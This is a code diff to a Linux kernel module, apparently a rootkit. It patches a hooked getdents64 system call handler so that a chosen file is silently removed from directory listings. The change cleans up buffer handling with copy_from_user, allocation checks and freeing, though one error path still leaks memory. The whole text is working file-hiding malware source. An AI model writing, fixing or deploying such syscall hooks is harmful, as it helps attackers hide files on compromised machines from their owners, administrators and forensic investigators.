@@ -189,32 +189,41 @@ long getdents64_hook(const struct pt_regs *regs)
 {
 	long ret = 0;
 	struct linux_dirent64 *filter_dirent;
-	char __user *usr_buf;
+	char __user *usr_buf, *buf;
 	char *out_buf;
-	size_t usr_buf_offset = 0, out_buf_offset = 0;
+	size_t buf_offset = 0, out_buf_offset = 0;
 
 	ret = sys_getdents64_orig(regs);
 	if (ret <= 0)
 		return ret;
-	usr_buf = kmalloc(ret, GFP_KERNEL);
+	buf = kmalloc(ret, GFP_KERNEL);
 	out_buf = kmalloc(ret, GFP_KERNEL);
-	if (!usr_buf)
-		return -ENOMEM;
+	if (!buf || !out_buf) {
+		ret = -ENOMEM;
+		goto free_buf;
+	}
 	usr_buf = (char *)regs->regs[1];
-	while (usr_buf_offset < ret) {
-		filter_dirent = (struct linux_dirent64 *)(usr_buf + usr_buf_offset);
+	if (copy_from_user(buf, usr_buf, ret))
+		return -EFAULT;
+	while (buf_offset < ret) {
+		filter_dirent = (struct linux_dirent64 *)(buf + buf_offset);
 		if (strcmp(hided_file.name, filter_dirent->d_name)) {
-		 	memcpy(out_buf+out_buf_offset,
-		 	       usr_buf+usr_buf_offset, filter_dirent->d_reclen);
+			memcpy(out_buf+out_buf_offset,
+			       buf+buf_offset, filter_dirent->d_reclen);
 			out_buf_offset += filter_dirent->d_reclen;
 		}
-		usr_buf_offset += filter_dirent->d_reclen;
+		buf_offset += filter_dirent->d_reclen;
 	}
-
-	if (copy_to_user(usr_buf, out_buf, out_buf_offset) < 0)
+	if (copy_to_user(usr_buf, out_buf, out_buf_offset)) {
 		ret = -EFAULT;
-	kfree(out_buf);
+		goto free_buf;
+	}
 	ret = out_buf_offset;
+free_buf:
+	if (buf)
+		kfree(buf);
+	if (out_buf)
+		kfree(out_buf);
 	return ret;
 }
 
